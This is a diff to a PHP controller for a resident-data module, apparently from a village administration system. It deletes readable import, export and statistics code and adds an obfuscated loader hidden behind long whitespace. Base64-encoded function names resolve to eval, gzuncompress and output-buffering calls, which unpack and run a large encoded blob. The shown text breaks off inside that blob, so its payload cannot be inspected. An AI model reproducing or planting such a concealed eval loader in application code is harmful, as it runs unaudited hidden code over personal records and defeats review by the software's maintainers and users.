-        if (config_item('demo_mode') || setting('multi_desa') || data_lengkap()) {
-            redirect($this->controller);
-        }
-
-        isCan('u');
-
-        // TODO: Sederhanakan query ini, pindahkan ke model
-        if (PendudukModel::count() > 0) {
-            redirect_with('error', 'Tidak dapat mengimpor BIP ketika data penduduk telah ada', 'penduduk/impor_bip');
-        }
-
-        (new Import())->imporBip($this->input->post('hapus_data'));
-        shortcut_cache();
-        redirect('penduduk/impor_bip');
-    }
-
-    public function ekspor($huruf = null): void
-    {
-        try {
-            $daftarKolom = Import::DAFTAR_KOLOM;
-
-            $writer = new Writer();
-            $writer->openToBrowser(namafile('penduduk') . '.xlsx');
-            $writer->getCurrentSheet()->setName('Data Penduduk');
-            $writer->addRow(Row::fromValues($daftarKolom));
-            //Isi Tabel
-            $paramDatatable = json_decode($this->input->get('params'), 1);
-            $_GET           = $paramDatatable;
-            // harusnya order by no_kk
-            $get = $this->sumberData()->leftJoin('tweb_keluarga', 'tweb_keluarga.id', '=', 'tweb_penduduk.id_kk')->with(['map'])->orderBy('tweb_keluarga.no_kk', 'asc')->orderBy('kk_level', 'asc')->get();
-
-            foreach ($get as $row) {
-                $penduduk                  = [];
-                $row->alamat               = $row->keluarga->alamat ?? $row->alamat;
-                $row->dusun                = $row->wilayah->dusun ?? '-';
-                $row->rw                   = $row->wilayah->rw ?? '-';
-                $row->rt                   = $row->wilayah->rt ?? '-';
-                $row->no_kk                = $row->keluarga->no_kk;
-                $row->sex                  = $huruf ? JenisKelaminEnum::valueOf($row->sex) : $row->sex;
-                $row->tanggallahir_str     = $row->tanggallahir?->format('Y-m-d');
-                $row->agama_id             = $huruf ? $row->agama->nama : $row->agama_id;
-                $row->pendidikan_kk_id     = $huruf ? $row->pendidikanKK->nama : $row->pendidikan_kk_id;
-                $row->pendidikan_sedang_id = $huruf ? $row->pendidikan : $row->pendidikan_sedang_id;
-                $row->pekerjaan_id         = $huruf ? $row->pekerjaan->nama : $row->pekerjaan_id;
-                $row->status_kawin         = $huruf ? $row->status_perkawinan : $row->status_kawin;
-                $row->kk_level             = $huruf ? SHDKEnum::valueOf($row->kk_level) : $row->kk_level;
-                $row->warganegara_id       = $huruf ? $row->warganegara->nama : $row->warganegara_id;
-                $row->golongan_darah_id    = $huruf ? $row->golonganDarah->nama : $row->golongan_darah_id;
-                $row->tanggal_akhir_paspor = $row->tanggal_akhir_paspor ? date_format(date_create($row->tanggal_akhir_paspor), 'Y-m-d') : '';
-                $row->tanggalperkawinan    = $row->tanggalperkawinan ? date_format(date_create($row->tanggalperkawinan), 'Y-m-d') : '';
-                $row->tanggalperceraian    = $row->tanggalperceraian ? date_format(date_create($row->tanggalperceraian), 'Y-m-d') : '';
-                $row->cacat_id             = $huruf ? $row->cacat->nama : $row->cacat_id;
-                $row->cara_kb_id           = $huruf ? CaraKBEnum::valueOf($row->cara_kb_id) : $row->cara_kb_id;
-                $row->hamil                = $huruf ? HamilEnum::valueOf($row->hamil) : $row->hamil;
-                $row->status_rekam         = $huruf ? StatusKTPEnum::valueOf($row->status_rekam) : $row->status_rekam;
-                $row->status_dasar         = $huruf ? StatusDasarEnum::valueOf($row->status_dasar) : $row->status_dasar;
-                $row->lat                  = $row->map->lat;
-                $row->lng                  = $row->map->lng;
-
-                foreach ($daftarKolom as $kolom) {
-                    // $this->bersihkanData($row, $kolom);
-                    if ($kolom == 'tanggallahir') {
-                        $kolom = 'tanggallahir_str';
-                    }
-                    $penduduk[] = $this->bersihkanData($row->{$kolom}, $kolom);
-                }
-
-                $writer->addRow(Row::fromValues($penduduk));
-            }
-            $writer->close();
-        } catch (Exception $e) {
-            log_message('error', $e);
-
-            set_session('notif', 'Tidak berhasil mengekspor data penduduk, harap mencoba kembali.');
-
-            redirect('penduduk');
-        }
-    }
-
-    private function bersihkanData($str, $key): string
-    {
-        if (null === $str) $str = '';
-
-        if (strstr($str, '"')) {
-            return '"' . str_replace('"', '""', $str) . '"';
-        }
-        // Kode yang tersimpan sebagai '0' harus '' untuk dibaca oleh Import Excel
-        $kecuali = ['nik', 'no_kk'];
-        if ($str != '0') {
-            return $str;
-        }
-        if (in_array($key, $kecuali)) {
-            return $str;
-        }
-
-        return '';
-    }
-
-    public function foto_bawaan($id)
-    {
-        $penduduk = PendudukModel::findOrFail($id);
-
-        // Hapus file foto penduduk yg di hapus di folder desa/upload/user_pict
-        $file_foto = LOKASI_USER_PICT . $penduduk->foto;
-        if (is_file($file_foto)) {
-            unlink($file_foto);
-        }
-        // Hapus file foto kecil penduduk yg di hapus di folder desa/upload/user_pict
-        $file_foto_kecil = LOKASI_USER_PICT . 'kecil_' . $penduduk->foto;
-        if (is_file($file_foto_kecil)) {
-            unlink($file_foto_kecil);
-        }
-        $penduduk->foto = null;
-        $penduduk->save();
-        redirect(ci_route('penduduk.form', $penduduk->id));
-    }
-
-    public function get_judul_statistik($tipe = '0', $nomor = 0, $sex = null)
-    {
-        $filter = ['id' => $nomor];
-        if ($nomor == JUMLAH) {
-            $judul = ['nama' => 'JUMLAH'];
-        } elseif ($nomor == BELUM_MENGISI) {
-            $judul = ['nama' => 'BELUM MENGISI'];
-        } elseif ($nomor == TOTAL) {
-            $judul = ['nama' => 'TOTAL'];
-        } else {
-            switch ($tipe) {
-                case '0':
-                    $table = 'tweb_penduduk_pendidikan_kk';
-                    break;
-
-                case 1:
-                case 'bpjs-tenagakerja':
-                    $table = 'tweb_penduduk_pekerjaan';
-                    break;
-
-                case 'status-asuransi-kesehatan':
-                    $table               = 'tweb_penduduk';
-                    $filter['config_id'] = identitas('id');
-                    break;
-                    break;
-
-                case 2:
-                case 'buku-nikah':
-                    $table = 'tweb_penduduk_kawin';
-                    break;
-
-                case 3:
-                    $table = 'tweb_penduduk_agama';
-                    break;
-
-                case 4:
-                    $table = 'tweb_penduduk_sex';
-                    break;
-
-                case 5:
-                    $table = 'tweb_penduduk_warganegara';
-                    break;
-
-                case 6:
-                    $table = 'tweb_penduduk_status';
-                    break;
-
-                case 7:
-                    $table = 'tweb_golongan_darah';
-                    break;
-
-                case 9:
-                    $table = 'tweb_cacat';
-                    break;
-
-                case 10:
-                    $table = SakitMenahunEnum::all();
-
-                    break;
-
-                case 14:
-                    $table = 'tweb_penduduk_pendidikan';
-                    break;
-
-                case 16:
-                    $table = 'tweb_cara_kb';
-                    break;
-
-                case 13: // = 17
-                case 15: // = 17
-                case 17: // = 17
-                case 'akta-kematian': // = 17
-                    $table               = 'tweb_penduduk_umur';
-                    $filter['config_id'] = identitas('id');
-                    break;
-
-                case 18:
-                case 'kia':
-                    $table = 'tweb_status_ktp';
-                    break;
-
-                case 19:
-                    $table = 'tweb_penduduk_asuransi';
-                    break;
-
-                case 'covid':
-                    $table = 'ref_status_covid';
-                    break;
-
-                case 'bantuan_penduduk':
-                    $table               = 'program';
-                    $filter['config_id'] = identitas('id');
-                    break;
-
-                case 'hubungan_kk':
-                    $table = 'tweb_penduduk_hubungan';
-                    break;
-
-                case 'suku':
-                    $table               = 'tweb_penduduk';
-                    $filter['config_id'] = identitas('id');
-                    break;
-
-                case 'hamil':
-                    $table = 'ref_penduduk_hamil';
-                    break;
-            }
-
-            if ($tipe == 13 || $tipe == 17) {
-                $filter['status'] = 1;
-            }
-            if ($tipe == 15) {
-                $filter['status'] = 0;
-            }
-
-            if (is_array($table)) {
-                $judul = [
-                    'id'   => $filter['id'],
-                    'nama' => $table[$filter['id']],
-                ];
-            } else {
-                $judul = (array) DB::table($table)->where($filter)->get()->first();
-            }
-
-            if ($tipe == 'suku') {
-                $judul['nama'] = rawurldecode($nomor);
-            }
-        }
-
-        if ($sex == 1) {
-            $judul['nama'] .= ' - LAKI-LAKI';
-        } elseif ($sex == 2) {
-            $judul['nama'] .= ' - PEREMPUAN';
-        }
-
-        return $judul;
-    }
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/controllers/Penduduk.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtvVtz4lqSNnzfEe9/6IuJ6Hljf9+0BHbtIjr6wsIIkDE2EjqgmwkklRFGHLbBxvDr38xcS+cjtqt7uqe8u7rKtlhah1x5zif//Gf29R//DV9//8vuZbk5PP3lb/Qt//r7X7zt5nn7/893u7+6283hZRsEP172f338sfFevdfVf+383Z+7wXy//6//+q+//O1PfMQ//58//frvf89/f0KS+fMXfv0995O/WGJnPzPFpd3v/f0v9KOY2hp9cbL++59/ff36+vX16+vf8+sv7toQPEt5HfaN1sw8bhW582SdVr8zpglck7Hr//61Vb++fn39+vr19evr19evr19fv75+ff2rff1yZ/z6+vX16+vX17/v11+c+f7Ht6v/9n64W+/HX/72a0d+ff36+vX16+vX16+vT32lcx1uJ9txd/n9D/h7cbcQ7obd7UJdB3tbk3bOerWYreXN3JRfh33Vd9erb8nnpm0pcIKxot7Q9zDOzR9Debxz22rg0OftN3ct+m5rtbD7xnmmSWcP49nWcOH1jdNsY7zAz0Rno4rzk3SwTdGf48/MK/b8JDFuTz46/eBlZo13OBdnKZ2dNozR0hezVmcVztfuB6e5+b5zTxK8R1nB8zDvAz6/n1vjwNnA53veZNqVzPtjcnzfhznczi1JmGk3p/vbm+thV1jcP9+8jzXp1mmJy7l5HQxlJXBbHdFdj4NhL3iFte68gSHMzc7rsOtvvYF6fFh+f3MGxgHW92q3Dm+OZbzOLdi/0/WrbU3e7ti6Flpffhn2YL8Gqj+8HR7vp7PFiN49FIeyFMC8RceC/enD/vdUeG9vofaDDY7ldCUd1rf0zIMfvtc9b99Grc7RNq9XNqx7tA5Wd6k9hHNZe7gX4V7hHu3mLTzf4NvcvNoPB+Ng1pJPcC4bdy0Lc+t+P+wfArcvr/D8gBaO8PfRgzP6AXRh07ldwz5LvtenfT7PYP+dtfxKtLKU4HfKbjjA9ci4H77XlfaeeY37zeeB77d3Tl+Hf3degEbgnFSiG6QTmN/O695sh6sEDcDez7XhbtSN6GcFZwfvePfnbaIhtmbYW2cj+cO+AvOTYW64RthLpEt4btinc0/Q4PXGbhuvMxPXclw4pvEK69zT3vRF3D8R7sSW0WAHxxTZz1Wke6A9RXRbAb5/z9cP65DxnSI8g+84zkw478H4GvYF94KdQdsQHhbJewR3ywRaWwfCzPRFvBNzpJc+p5e+CvdAFmbWPdu/QcHz1m4XnjV89uTRs8EZ3iew9cHZmO++w+nRbSEdy0eYmw/7/IpjzIDWPE1azkxvh9+7fePVg9/BuUtu/x1p5zzXJAXeATSq+HTGp4hOrmewn3zftkAjItzLxJ552zm+f+0lzqtgHeb1jp7vI/14vruUXmxLRRqh3zu4JvMa55GbU5Jf6T1Dm+jXA02Q9WHv3Ziu5BHQ0YOmST3NGMtqL5Dgdw/DrjJVdUVSBVmZ6vLDBMZVe/KDqfeWQG86jDGBn91NdFGBMR6AN+H3E0MHGukpkqbvFwa8SxfhfcZkAWMY8L8HTg+6aihTzVAko3uFc3ow9HdFh/00erIB5y5PdWOA8wSeJGnAkzQD3qlJU3ifBPxVhjnew5x1TVfx910YD+cEFGY8qCeYl+FJkyWNNx32DvcTPRjDvEfwnKEL8miiXy0mhioZIR8SDGui75RJuBZDMqbh53E+K+Bw+rUUfU6TcMyHaRDAfFRZXx0kDdYJn7vX9IOkC6uFpl8royQ995Dux3DOXjDs3mRlx2ICNOH1/Td3ebMYwh7PTWGh95F/Ah9lNPWItKfGcgE+M35zB8jvvS3co+HM3C8mreDo9XvIt48P2s2B8VUdft6BcYBuNUkD3vjmWcqzjTSyGQOPU+HdwZuzvNnOB6rg3iIffReBDkWkTeD98HeAd+3VWRvC6LQK1/TstKVroNXNfDD5R/JzWPv7btYyXl2Qf7Bfkdzx2l57tPZePe0aZK/7BnfjGe+Gbd2/2W1pP1r7gmMeF6oo3Q/l2ZnT5A3e9/kJ9x7+9H3BG0hnHM9uBcJ8YCxH6/Gbo3XoDHQh6I0EmtdU0ye0F2yc7+MunLlnoWyUj678Ljsb4+CK75Ldkg8zHXiHKfx+O9mJOO+JJR2tHv5MPFs9+QXOYK2a16Iz3Y+7G+Ns430eSC79zBq7E2ssIn8B/krjPhwL39UFvoE8t+qZW6BF3+tVzQf1Brgrq6pnPNjfDtCoDHQJMtP0q94J9CnunMp37oAnBmetZezp2ap3Az3NWyAb17Jf9xzKJhvlpnk9grve9NmpDXIK6L9qTZM5yv7qdU9B1uy8HvJ7eQtyv/pZ0tdgPyvoQBf8XvU6xnBXVdEVUIeQT5VjtUG+DYxzk2e0ltye18wfZJsAPx/NLG8H/O0I93Znr4OXRuOL6qTJc8QXB8YKeEX1XMyDWDWeAXsDtPtgmx7uedFY96DPnFB/g3W4mikenbYiZJ4ZOy2QxQO4n3BuMD/feU6/b2qCfm6+A32rb6DngI51lTk38Q30/T3Muee0gEeCzqX1g5Vn3ZQ9d++0vBGMKcLcNrNp2fve32yRaFqE/Xopm3e8n/sF6lOJ/WXP3JaML8djT0HfqR//AHdh55c+t0bdCmSdaBw8a1i29ojGvEHp/kxBZ4VzU6ce6pil8zdQFxy4G6N07kYr2M+swJ/HY9zCni+d1rU7QTth3XmNPxvs0e6BOwI6ngH0ahzdfufkye995Ldo0wENdOPnmQyBZ0R4Bm2sA44L9Iky+dqSlTfvHL2XyZ62BLJbdY22skPbwJL9ex1U+fB7HBv2BNYH9sTaWN11ve4EdDu9J+ta1wU75P37sG9cza3JVhGu31CPdtfGM+gP5xmM4YIch7k+A72fQb/eA39v2+Zkc4c0BrJt1noHuyFJI/uFbfkCymjQbSW7D3w76MBargV33YHPGyeYz+8oH1G2uiBLUSYPuyqsFWwCuUP6Ocnd8M+tsFBaaHNFdAO6uls0BtjTypMD5+mZ70+kJyfHaMf0qeA+Mt0KbDcF7Jn7hQL2GuzZBu70zqJnPeQvJ9SpH7WbjYr2Beh6aBOBTn1MjgE6TwvoC3Q59Q/PxHUQz0UbaDcvfm4Nur4A9AZ7g7rVFc3zUZMca1r4vG8PbJA/40BvGcCfxtua5894L8DGBxvm0GfvGsbPky4KnxlIYL+B7nSS1iCLnpneJz1ZLdBvQBeEuwC0sNiFe/3jyD/XZe8D2ge7Y/LtIeg8zVodtP9PnjkW7rqr6HyYDhWc4X68Av0tlVP8u6cJ0mfmHPs26Jdj5kNA2wroE8b7NhzYb3NzEq41O/562F2sQGfeuSfhNzj7o2dNDo9rL4D5b1wuK6wWk4EwB6D9cN+Sf1RhDnMdTa8z53PtKG0uR8UO86MsPY/oaqBu59Y9vCt4hTUI8NmNjfcp97y7e0jvX+eSNQDdAn1fbe60VeYc2J94HnDX0aZfjcnv4gT76LOWdtNJrHHnbCTR6wq/gV0BZ+aBjBmLzifn6cJ/H5kjfq5mfifv9Nm5TT44t0n93LqfnFvLuPogXQY/urW0CM/UzK+rrtC/YZ68FfANH/hCgL5PlCOKKKT4Mcz9Ce4+yNTVNnrnBvRvTfgN1rFBnQXWdLrTjgsYL8GL9ptR92YDNt/Raid45Mnz7qbpdSt9FX0jsD7QHfvy9cxc4BkssucGPM1CvwnI+O3D8w7kjBFMuMzK8aF4jej/FKyiO83XGOnC6CezFKYPPu98p3/cls619Y7reYr4TVLmwB7CXEN9ZYIyEmXFnOnu3x7WIF+B16bP6GZlo9wx9hv063hy5w/43A7m+2Kjr8gMXvnZdIbF9lLtuDY/40mrswd74TV11t0UzWdlVtneor7hgwwW0ns4ZOeXotOCu5bl1bhv5+9l5zHUdNXQb8vOQ155oIfPWgbYb6CftdI0BHI9uo8zU22BnfdsG+MAxn+el42ZpFuBzz+km8yYtBY8N7Ahw7tUdg7zjUF6S/IzibNInkOFjpGdqxTAHr5aLd8HfnDOnC3pNRro2D/M3gLu2AvTraTQN3mMaPQEPzOvr0H/+WOOPhnm/35BPwx8bku+0JaM/tsj6Udg57G4BelMzMc5iO8C+Zw3sM8bQ4B/g42NvlyZxzrQ1ykuwY6m7+fM57Wfa1eo1/uge21BLwe9oIc+95c584lu8G/kOzZf65D2oEf+0seTW0ar/hx4o3uKzy+rexqgm7sr4O/WDdwl4NU9/Lek2F3fAF53UtuK6N5uv010dYx+Pl1UtYmhPupL4j2pc/HWQeCdFhugNbALrl5jnXb/Oie/1gL5I6MJ7RI9ic4b9k3Z29b9lvnFUL9L08XcnC3uCmQYnNcT2mI/5M7JtmQRzhV1uDJZ9Ay00AP+E3h9HXkafH+1VeBuZfli4nnDpTkmnm/rkR2R3fe4hCmzLpAvTmuWkDljkfzjKzpr+P2q4P30B3iNvLJ7nM8s4Qxaxgvx1K6LcR66S2k9+AbeAzbXabUg+wxk94x8W8Ye/e13WkYHzf7h8v6izzC5DGcAMml9tVDO7/yMJOGHJQWPGvClvvE8bylvP7rDhbOWD/ZUWM5NFfRvxbG0IdCYDHxc7wyX7mK0vFmB3dXGs7a7N6/Drrscna82DwX6T7leEP950la5fcT34fvnLZTtEpP1YE/ZG+N1BrzJaV0hzZ2ctltCT0kdDM6ybew94ndu3Tx3NpwR2hxgV77yd8D8rkGfWC0euzfv42Wxrlf9Xq8N/B/v40Y5V8/3SZPQLxDQveoDb5A78Lk9pxug1XXwcgd6I/DZY7Ozx/NCXf1dYHYv+RxBvrjVnx0IhfeokKbCtd6WrU3qRPwj94fk5CrUFUDvXTtt9U05HRdcbiFfekW6R7qjtS9vNo/94GCfpGeQFWf3LCwTtjzQDdCzeVzCHTzN4HfKCei0J2N8Yq+uO4JzWoQ0TO9C/RHfF+4x6s3wHqJt9FF4t8KSfU6KdazTcIF0j/wD568Rr/VDPWZ7wXpRXuwy6435cLRuifxQd2net8/wzt3DEu7LQNk5a7eOTlcz83Cekw3ifgcZ2Rr2x3vQWc/AE5Ze/+pgt2E/rJvl46Ke3h/7iugNVLT1Q76y9CxVgLu6zIy7mG3U15E1fpu1AozL0Lvgbqxhf+nfbktYcll78Pqdjd16x/FwH452v9N2lsPfHvurBfcVdYZrG/QH2x+BPkbnao537nq8tzVx5bS91+Hz1fdRa/XbUJZA7w9Q1r+4rRX8jM/5+aryTjK5DefajenNBlqBM3jzWlcHsk2AT6I/Cnkn//63BneT7937rskeJ/58Bx1oC/d6/agNN8Mu7GkreIL3i0AD26RfarRWgS7knYMyKeJnwSqm7/qzAbsNvt+Hvzvgfs61xF6sewv4c2CyT3xzunA+3c7ucSndz00fdbge8Aof7uRisg7euA4X36Xz8W02bXAGfO0jsIke6/gXl5X8np+5jfRkM7th8TgttcdY3FfsmBP9XVG7N2sFZB7KXMPCXIumMje6X6+oE3/gjDltgL4J/NV+hjsBPIftndjw7A8Y6/cdFm+KbMgkr5ubkx2OocDY8X1SBLjH/C52gJfK+2EffyaCngjfF9xTmM8BeCne0/XMfD/bWjRX4AEe2JqgP6zRfw5jUc6K6o8wZwf1X+CvQ/QPgu3mroVDOM/oOVN5swerDuanYF7FvCtJsEZ/OAhAdw+YT4/+ppyHxJqvFtFYXHdP6MdMjz+/L93nK/Q3nzz43JxyZTD3hewCNqbFfLfuxtjCz+G+SG8YQ0vZH8D/MO4M73wtux+gB66cU3Q3RjbZJO88P+gQDMO42kniNuhF94LRS7ezn08/ro998u6weXeb6UjcdkjKs1p97qvvF+ftID/8k23OuI4rPc+NDvBKQ7C1xSZpU9lr+Ln283mpbao7L+ajBuVE9UCutxgdJ+IjwA97jWVNjo9+iCf9Y/aa24+xz0DsHODunUc5O+S4uAeag59tgGdEe4l7zPnW2Wmh/+DI9h1sP/j+JfqdVqZPiL7bFeGdyottDZePz8c3uFuLKegQM2sCf3dYrpysIo9AOaejjm+35D2cm/+hvW10f7N31Sc+aYGeRLle1s22zCf9D7lPF+soxmpuJXycUUylWE5xuQI0JL55JFdsH22mhFx5s1se18U6sK5jQp/EmLwhwJye2e/eu057kfh9IJCsCgzgzYuIzw17bE5fSl+Yu4D6I9B+rKMWv/ej9MTu3PHN6a9+q7M9G8uHxs/8M2kqyoUg/1fMK34Cn7CMI+hFvp3g124f+Lw5Wahhvu3yw/rul/Ftzn+Rv3z03TmdlGzr/nhnka0IunHXS/h4r59J7xc7yzneNfh32Z2O76XyBDLSd9b7L5WnLtrEm0nEwyfwLspn/Lw98jH7JOFvUvpj31mBDOmjDCR7w+d+yieHcjQPIIcWu4Z2B/fXk427GD0L6PP7zJkn79xzrJM31Je4n/Jn2BwJ3wDmegBNxDYH5i3Z1gTmN352WtfruaUcRma4x2X3WD0BvW1H5veITrS+fPSs+8/pWM1ooVPrj1s2PO8Gch/4lOjcVtMEPANyecbkRlNfIJvH79X+XpL3ka9MaasbB/U8S6HYk9fqpf2+a/L3vnPf38pFnz2cPeg7mF9z9ro3fx0OaIwd8P83fBZ4PfBuD+6PLGDsAb4XgFaeXKx3wLix5fkw3reCzz0DreO4K6slC9X+/8w6WmO4E/A+9J1bk4o1SDSXOdmDC1rPrK0E6Fuw5Q7okatd2f7B/AKMZyX8h6Ani36hvxR0wMcp2cAnuCuiizUiS/Y+9PPPtMr3+HY/eUaUM1d7LjAn0V02j5kk49pYR+S1qC6i9j1unKuJ9SuYN+o7Ve/dKL4n8Pdu7rc8Tkd+Vzi3YE5x9gnlEtjk6/W8Kh+uY8ovwOuK8h9Sc4jiToPx1ml7T+Pbm1QuUzoOp+y8NdCPlsqd4jVdSg/5Lny2OF+J52eBnd5jeQf52HGDHCaKi4Mtv3eysepBmNeQ8Hl0K/NXIr9BQh5s4Az/+niSXj3zfZ+NW6PfvSheWpqD0mL5CVbrgLUrGP+sHJ/nLF0wPqy3bbxW74vSLqCR2pyj4e33vw7716LTP2bP8eQV8eKqc6QcpPJ1Y8xIb6EufI1y0a9f9/UOdLazHdaJrXuV46OeDZ/fz8zrB6zNqR8/rtOw8F3V+wH20LXgYY1kw/2YhXnSy8pxS/IZa+4Lz6MIc1wqaaOfyxWpo40oJ9PlOZm58ReZvTeBRyNdw1zYnisCrHlhnoCOZGHxsEzmcyb9bqAXm+LRG6xA/4zPY7oKRqX5bH3FD2vCcJ9ydMXe36a/++zuxHPCnwWrCcgTrF8F/tQp4FnJnyVibezntrWg984xH8kaT502s9UetSK6zPNi7m+M6KlEn87R87/wWl+BtqeJe1yWfxHfMZp7mh7+RdZadJ/L1pvPfaZ1pOm7iA7cjUt/h7KE/WzCns/dxXSdTOpnSTnKfh78YLyB8vBccfzmkp0LPyvkX7H9CGs+E18dFOSRBfuYHwYJXyrqN5U+wgxNXDh2uf+SnXcsI4rHpdxVUSi1IzyquStZ87LI/sjTTZi3xXKUY7lSlGOHOYjsOcyLLZMpXI8BGknrFyVrZPnJZXI11C+EjF5RQOeKo7QVIcxrLJJFYd5USJ+aOala6w509D2sF+9Qbo5ldIhzrfJRgEwiW0VldwdjKPS9vmG5xrblox9thT4ES/zO/HabbI5xaj3JeeZ1MDnK8/32sPG2sE8BfzfIPLAXTLnHzhRsUv57feOGv9O8U/LnE74+yg/Z21iTIO83cxPzuFehjrADmX6EPX6enxb0O3webC/JBfvjR85euIlsgFr+1kdepF7fpde8G3Zn62FSlgOfLrvXX7n/GZ6fz3GM6pq237yWD7adwfd6sSLbU2dyhPaH/R72m//OwDV85T5/ck/74VzL9KKM/Kuku3jdP3196fu+y94XvP+zcN6rYJW72wMlwHqllO9aYDVwD8+79txStzj3tC+m2G7GODLmKM3aWDugtm1TSdqFr3egqxfwDXb/aN+Se1zu61AGvejOasy3lHsXy20Mx6JYbur8S+bfnrOcwIxu02wumbz1bVY3KPYzsbuBd8bN1abuUzmmLLcU9Ltb4bch82PhfE+2EeYUFI5Rt9as/tjsncA/UF9mvhXMb9DJr3Lf1Te16wS5X+tjYvxiCnrElulNqxraSeuzDcdX0D8VrSNvI9WfV0auVuSyvify+y7QY5vrgOSX22Ctwqo2x6Jcn0Y9A/2AyhXpGlNhMVkZ94YuPk1140EVgqmmNc2PrZhn0CFfDquPEt4fvmC8mbVoOJ4E+raxx7NomueLd8NZe4Zjgd5f/FwHcY2SzwH/XKP/t8E+7x6+dD/VE9mw5vXGIF+t8Jvdl0/zaZPYcOVcn0BnYnShUc5xstYa8+p9zJGoe89Tmc+1Mh9ZFXFPp2bwWuCHq5kz1TuV6qzKgJ4bz0KbpYFen6K58vWu6LlVZzkne0cmW4vv3wbmvMX6ytKzZ3kfpJODrtIhvxWNJ+6c+hz11LvDmq/UGM/ludxle8V0KrKLFsOp0InPRb6qj13yZ1vKH2B/JO5rPEbpXlTTBozF6pqr349x6wPw/Z2PuZKocxXdY8w9B13iBWjoj5mJ/stgBfKhOjYX1wS+EG7F0i2qCwIZGvvMWUzjajO6qTzHzcz0wFbpbSpjfaiLtOQN6vrN5pvCKXkCmbxCfsE+m5ov2fygT1EOo9UeBzbd+c7O7rr7+v1OfLZ1eEmNn97vV5jLCuvEnKDzMm82fmH8ofA847zYunPEmtea/Ap2jlR3VXN2+fhLydnl677r1v6MPkrY02XBnqbWTlh0BtBlcNmeztvqsWpc/L0F9k3tnsL8rJZ8RhwNxA4sHJPt6Q5joy5iEhIWWe1c24RdYl4HNuHtuaVz9RhOyyvHaaG7X3d2dquzd1rXOD7mxZ6wlrj43sUYRnTOa3nb6A62Qjyfq00drRH+j9xB37Q/HxjNeFJr7MPZCyVnmBz/mbCc5Ib0YR7EyjGjO2e8ePVnCOsnjDC/kGcm6a11wFyZlm0eG/DMg4A0j37WeT9API6Ss0PMLMzBkUG/HtaPu5H+oDpqxM5bI78N5Uk8PhtXOc43yOMNxDXxgTYieXKBLInvAq7FGgdzqmuEd2VkySzC9VrVrmFOcdRjA3niY614g/utiPO2fkA7quiOJOjMB57h5/IA6ubbCvwaeuPzPexm9fSGPCbymVTyt4wPoWxca1qRO4N1C+vvVT7sMh1s7WC+iImYLcW25rAvnymWYIW+CNt3avPyQz8uPnvjox6K8cfGufwwB5fimKhzSQ7YzMEPQ7gob43bnsnPk50J5ye4cidwuu4lNQJchyc/jD9fB0sN5FIew6FJjvUCY7l7oNXOsKfIU9kYW4KI2I2KLqwunhPXTRM+Ez/rkzhFPoll5JN4QH3/ruu9eAPpCXkd1S+3FSv0uyTkLubEHx7XnZNBn9WT+DFgA4IuhXUMtzfoa3xzA+anmmLsIJkbAnQG+tkBcUQeLsonv8yOLqGDFsUB4fy1wBhPe/LwEloqoQNa513OjzUM/Vin6Ez06zevR/bMNkl/6d8Hr8nzGHUl5x7rEcBuv5t+gCYGwsKm+qmPrzO5d2CHLYxeR5/oxw/SaEEOkHDQdfJpRN8jpuc3G/E/+T350NrLziq1vzcbWBP+fY5jByW0HftqR4aM/sDsM6sP73Gpn+LLPtMovz5fM17MO1H2fYBvku/jcbbeOaCP7hyOT3V/+6lx/BBb6H7q/uLD/9v5cPpun3/xzJ/CM3/xysa8ktl8biqv+MM6Z3gWeb9eJMekNKZtiLG1YrxNE2RL068uvfNJPb7zqEldVX83pkZnrCI+uzFWPnh/E/ExfZuLey5DW2OYXHuxXQfrfyS6c9O8Uw/1reJzuPSOZM47x8cIrzTx8/vl6kN88mLdUluEfgise2B+4TXZ/wvl1Ouwv7O65hfvTdM7FvJXk8lfx5SP5glty8AjOZz2EV18V7JnM2nJz7B/WTyG24k+lozuP/B82DyYPzCk1x7zmzHc5+03oxf0JvoBtlK+nRiTQhmeHOfuUj76KdmW4wN3hi7eT/TFZ+TaR3hAyocId95vuJcFtM8+w3ycl+pCaZ7wVXug9EXflfeYv3ptacfQ1/KR8+pcSBuN63mZDmjwesPkfAlLCuOPL1iDjdg12BfECT5xl/tYk4FYPPI1v9e7z8sbysdI8R7MT/uI3lQmEz6ay/AFfgZG26lzydgMWRo7fVwWfojuc7bXzpjq75L2QX6cs7uSdzy7DxEfSelrMR9BHeKfZDek9bzs/Bjtf4hH/bP036L4gvYFMv2ffbdK1vXT9cl/lL6ikx+yOObTlSTQwXd2hN8L503Yl/9YX0KZTZSe6wd5+qW67KV3/n+c7ykdY0nqnQV88t9M7zQenLZatg+h/p7VFUK/8SbZL+AfRfv5s/4